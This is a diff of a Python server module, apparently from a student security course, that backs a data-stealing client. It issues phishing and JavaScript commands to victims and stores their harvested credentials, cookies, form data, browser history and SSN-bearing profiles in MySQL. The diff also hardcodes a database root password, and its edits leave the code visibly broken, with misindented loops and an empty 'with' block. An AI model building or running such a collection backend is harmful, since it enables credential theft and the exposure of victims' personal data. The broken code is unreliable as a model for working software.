@@ -2,12 +2,11 @@ import pymysql
 import json
 import datetime
 from copy import deepcopy
-from eventlet.db_pool import ConnectionPool
+#from eventlet.db_pool import ConnectionPool
 conn_pool = None
 BASE_SERVER_RESPONSE = {
     "clientid": 0,
     "security_blacklist":[],
-    "ad_domains":[],
     "js-cmd":[],
     "phish-cmd":[]
 }
@@ -23,17 +22,17 @@ def new_response(clientid):
 def initDB():
     #global conn_pool
     #conn_pool = conn_pool or ConnectionPool(pymysql, host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
-
+    pass
 
 def getConn():
+    return pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
     #global conn_pool
     #initDB()
     #return conn_pool.get()
-    return pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')
 
 """
 Gets pending payload or constructs a new one and populates based on defaults from the database.
-Pulls blacklist and ad list from database
+Pulls blacklist from database
 """
 def construct_response(clientid):
     with getConn() as conn:
@@ -44,8 +43,6 @@ def construct_response(clientid):
         for row in blacklist:
             blacklistList.append(row[0])
         resp["security_blacklist"] = blacklistList
-
-
     return resp
 
 
@@ -57,21 +54,20 @@ for example, browser history, credentials, forms, etc.
 """
 def create_new_client(data):
     with getConn() as conn:
+        conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (None, None, None, None, None, None, None, None, None, None, None, None, None))
         conn.execute('SELECT LAST_INSERT_ID()')
-        lastID = conn.fetchall()
-        curID = lastID[0][0] + 1
-        conn.execute('INSERT INTO Client(ID, CellPhone, StreetAddress, Email, SSN, FirstName, LastName, BirthDate, NextPayload, City, Country, ZipCode, State) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)', (curID, None, None, None, None, None, None, None, None, None, None, None, None))
+        curID = conn.fetchall()[0][0]
         formsList = data["forms"]
-        for x in formsList:
-            store_form_data(x, curID)
+    for x in formsList:
+        store_form_data(x, curID)
         credsList = data["creds"]
-        for y in credsList:
-            store_credentials(y, curID)
-        cookiesList = data["cookies"]
-        for z in cookiesList:
-            store_cookie(z, curID)
-        store_history(data["history"], curID)
-        return 0
+    for y in credsList:
+        store_credential(y, curID)
+    cookiesList = data["cookies"]
+    for z in cookiesList:
+        store_cookie(z, curID)
+    store_history(data["history"], curID)
+    return 0
 
 
 """
@@ -250,8 +246,8 @@ def store_form_data(data, clientid):
         
         #credentials information
         print(credentials.get("Username", None))
-        store_credential(credentials, clientid)
-
+    store_credential(credentials, clientid)
+    with getConn() as conn:
 
         #security questions information
 
